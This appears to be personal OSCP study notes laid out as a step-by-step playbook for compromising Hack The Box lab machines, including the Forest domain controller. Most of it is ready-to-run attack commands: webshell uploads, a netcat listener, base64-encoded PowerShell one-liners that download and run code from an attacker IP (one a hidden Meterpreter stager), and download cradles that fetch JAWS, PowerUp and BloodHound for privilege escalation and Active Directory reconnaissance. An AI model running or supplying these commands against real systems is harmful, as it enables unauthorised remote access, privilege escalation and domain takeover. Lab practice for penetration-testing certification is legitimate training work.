1: add given tagets to ips.txt
```
vi ips.txt
```
2: nmap all ports (fast) against ips.txt
```
for i in $(cat ips.txt); do nmap -Pn -v -p- $i --min-rate 10000 -oN scans/nmap-alltcp_$i.txt; done 
```
3: at the same time, also do common ports scan
```
for i in $(cat ips.txt);do nmap -Pn -v -p 22,3306,8080,8081,5985,443,80,1433,53,445,25,143,110,993,3389,995,139,587,135 -sCV -oN scans/nmap-tcpscans_$i.txt $i;done
```
4: from the nmap result, if it shows domain name, most likely it will be a AD boxes.
1) from ssl certs on port 3389 (rdp), cert name ->commonName:dc
2) from smb, domain name
e.g. 
```
PORT     STATE  SERVICE         VERSION
25/tcp   open   smtp-proxy      Avast! anti-virus smtp proxy (cannot connect to 172.16.79.150)
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
53/tcp   open   domain          Simple DNS Plus
80/tcp   closed http
110/tcp  open   pop3?
135/tcp  open   msrpc?
139/tcp  open   netbios-ssn?
143/tcp  open   imap?
|_imap-capabilities: CAPABILITY
443/tcp  closed https
445/tcp  open   microsoft-ds?
587/tcp  open   submission?
|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed
993/tcp  open   imaps?
995/tcp  open   pop3s?
3389/tcp open   ms-wbt-server   Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc04.tricky.com
| Issuer: commonName=dc04.tricky.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-01T12:35:47
| Not valid after:  2022-07-03T12:35:47
| MD5:   2c92 fa46 b005 4572 b681 a094 62c6 7623
|_SHA-1: 0d66 a610 6949 b6b0 d12d 4c81 94ce 4333 5276 ceb4
```
```
PORT     STATE  SERVICE       VERSION
53/tcp   open   domain        Simple DNS Plus
88/tcp   open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-28 04:56:18Z)
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
5985/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m46s, deviation: 4h37m08s, median: 6m45s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-12-27T20:37:01-08:00
```
5: find out which box to attack initally -> likely be the dev/web box, normally wont be DC
6: from it's nmap result -> get webshell
1) file upload (aspx) and execute
```
┌──(kali㉿kali)-[~/oscp/exam]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
```
   file upload (php) and execute
```
┌──(kali㉿kali)-[~/oscp]
└─$ cp /usr/share/webshells/php/qsd-php-backdoor.php .    
```
2) prepare powershell reverse shell
```
cd ~/oscp
```
```
python3 makers.py -l 192.168.125.163 -p 443
```
3) start a listener to get initial shell
```
sudo rlwrap nc -lnvp 443
```
4) run reverse shell command (powershell oneliner -> makers will provide)
```
powershell -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADIANQAuADEANgAzAC8AcgBzAC4AdAB4AHQAJwApAA==
```

### local prev escalation
7: run jaws.txt & up.txt
1) load jaws - any credentials / any processes run by NT Authority/System
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/jaws.txt')
```
```
download c:\windows\tasks\jawchecks.txt
```
2) load powerup
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/up.txt')
```
```
type c:\windows\tasks\upchecks.txt
```
```
ModifiablePath    : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
IdentityReference : HTB\svc-alfresco
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
```
8: upgrade to meterpreter (to chaneg local ip) --> run makerunner.py -> run msfconsole
![[Screenshot 2022-01-15 at 13.01.00 .png]]
![[Screenshot 2022-01-15 at 13.05.40 .png]]
9: run the powershell generated by makerunner.py on the inital shell or webshell _ to receive a meterpreter on just now the msfconsole (prepare to download bloodhund zip file)
```
powershell -Win hidden -nonI -noP -Exe ByPass -ENC JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAyADUALgAxADYAMwAvAHIAdQBuAC4AdAB4AHQAJwApACkA

```
10: on meterpreter, type shell to enter shell
11: type powershell to enter powershell session
```
iex(new-object net.webclient).downloadstring('http://10.10.14.37/hound.txt')
```
from nmap result, knew the domain name, to update in the hound.txt
![[Screenshot 2022-01-15 at 13.12.45 .png]]
```
Invoke-BloodHound -Domain htb.local -CollectionMethod All -OutputDirectory "c:\windows\tasks\"
```
download to be done in meterpreter session, to exit from shell/powershell, type control+z
```
cd /windows/tasks
ls
```
```
download 20211227220509_BloodHound.zip
```
12: follow htb forest
